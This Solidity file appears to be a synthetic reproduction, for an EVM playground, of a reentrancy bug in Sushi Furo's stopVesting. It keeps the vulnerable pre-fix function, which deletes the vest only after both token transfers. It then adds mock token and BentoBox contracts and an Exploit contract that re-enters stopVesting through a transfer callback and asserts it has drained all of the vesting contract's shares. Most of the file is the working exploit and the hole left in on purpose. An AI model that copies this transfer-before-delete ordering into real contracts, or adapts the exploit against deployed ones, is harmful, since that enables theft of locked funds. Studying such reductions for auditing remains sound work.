// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Sushi Furo — stopVesting reentrancy (Sigma Prime, finding #19588)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: FuroVesting.stopVesting (pre sushiswap/furo#17, parent b422ac07)
    calls _transferToken twice and only then `delete vests[vestId]`.
    A token that calls back into the recipient during BentoBox.withdraw
    re-enters stopVesting while the vest still exists and pulls the
    contract's shares a second time. Vulnerable lines preserved verbatim. */

contract CallbackToken {
    mapping(address => uint256) public balanceOf;
    address public hook;

    function setHook(address hook_) external {
        hook = hook_;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        if (amt > 0 && to == hook) {
            (bool ok,) = to.call(abi.encodeWithSignature("onTokens()"));
            ok;
        }
        return true;
    }
}

contract MockBento {
    mapping(address => mapping(address => uint256)) public balanceOf;

    function credit(address token, address who, uint256 shares) external {
        balanceOf[token][who] += shares;
        CallbackToken(token).mint(address(this), shares);
    }

    function withdraw(address token, address from, address to, uint256 amount, uint256 shares) external {
        uint256 pay = shares > 0 ? shares : amount;
        if (pay == 0) return;
        require(balanceOf[token][from] >= pay, "box");
        balanceOf[token][from] -= pay;
        require(CallbackToken(token).transfer(to, pay), "xfer");
    }
}

contract FuroVesting {
    error NotOwner();

    struct Vest {
        address owner;
        address token;
        uint32 start;
        uint32 cliffDuration;
        uint32 stepDuration;
        uint32 steps;
        uint128 cliffAmount;
        uint128 stepAmount;
        uint128 claimed;
    }

    MockBento public bento;
    mapping(uint256 => Vest) public vests;
    mapping(uint256 => address) public ownerOf;

    constructor(MockBento bento_) {
        bento = bento_;
    }

    function seed(
        uint256 vestId,
        address owner,
        address recipient,
        address token,
        uint128 cliffAmount,
        uint128 stepAmount,
        uint32 steps
    ) external {
        vests[vestId] = Vest({
            owner: owner,
            token: token,
            start: 0,
            cliffDuration: 0,
            stepDuration: 1,
            steps: steps,
            cliffAmount: cliffAmount,
            stepAmount: stepAmount,
            claimed: 0
        });
        ownerOf[vestId] = recipient;
    }

    // Verbatim pre-fix body (sushiswap/furo b422ac07). delete is after both transfers.
    function stopVesting(uint256 vestId, bool toBentoBox) external virtual {
        Vest memory vest = vests[vestId];
        if (vest.owner != msg.sender) revert NotOwner();
        uint256 canClaim = _balanceOf(vest) - vest.claimed;
        uint256 returnAmount = (vest.cliffAmount + (vest.steps * vest.stepAmount)) - canClaim;
        // @> VULN: both _transferToken calls run before delete vests[vestId]
        _transferToken(address(vest.token), address(this), ownerOf[vestId], canClaim, toBentoBox);

        _transferToken(address(vest.token), address(this), msg.sender, returnAmount, toBentoBox);

        delete vests[vestId];
    }

    function _balanceOf(Vest memory vest) internal view returns (uint256 claimable) {
        uint256 timeAfterCliff = vest.start + vest.cliffDuration;
        if (block.timestamp < timeAfterCliff) return claimable;
        uint256 passedSinceCliff = block.timestamp - timeAfterCliff;
        uint256 stepPassed = passedSinceCliff / vest.stepDuration;
        if (stepPassed > vest.steps) stepPassed = vest.steps;
        claimable = vest.cliffAmount + (vest.stepAmount * stepPassed);
    }

    function _transferToken(address token, address from, address to, uint256 shares, bool toBentoBox) internal {
        if (toBentoBox) {
            revert("bento path unused");
        } else {
            bento.withdraw(token, from, to, 0, shares);
        }
    }
}

contract Exploit {
    CallbackToken public token;
    MockBento public bento;
    FuroVesting public vesting;
    bool internal armed;
    uint256 public reentries;

    constructor() {
        token = new CallbackToken();
        bento = new MockBento();
        vesting = new FuroVesting(bento);
        token.setHook(address(this));
    }

    function onTokens() external {
        reentries += 1;
        if (!armed) return;
        armed = false;
        vesting.stopVesting(1, false);
    }

    function run() external {
        bento.credit(address(token), address(vesting), 200);
        vesting.seed(1, address(this), address(this), address(token), 0, 100, 1);
        armed = true;
        vesting.stopVesting(1, false);
        require(token.balanceOf(address(this)) == 200, "drained");
        require(bento.balanceOf(address(token), address(vesting)) == 0, "box left");
        require(reentries == 2, "reenter");
    }
}
